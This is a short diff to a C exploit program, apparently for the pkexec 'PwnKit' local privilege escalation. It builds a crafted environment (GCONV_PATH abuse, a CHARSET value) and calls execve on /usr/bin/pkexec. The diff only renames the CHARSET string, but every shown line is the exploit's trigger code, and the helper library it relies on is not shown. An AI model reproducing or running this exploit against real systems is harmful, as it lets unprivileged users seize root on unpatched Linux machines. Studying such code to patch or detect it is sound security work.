@@ -6,7 +6,7 @@ int main() {
         "pwn",
         "TERM=..",
         "PATH=GCONV_PATH=.",
-        "CHARSET=FUCKYOU",
+        "CHARSET=BRUH",
         NULL};
 
     execve("/usr/bin/pkexec", argv, envp);
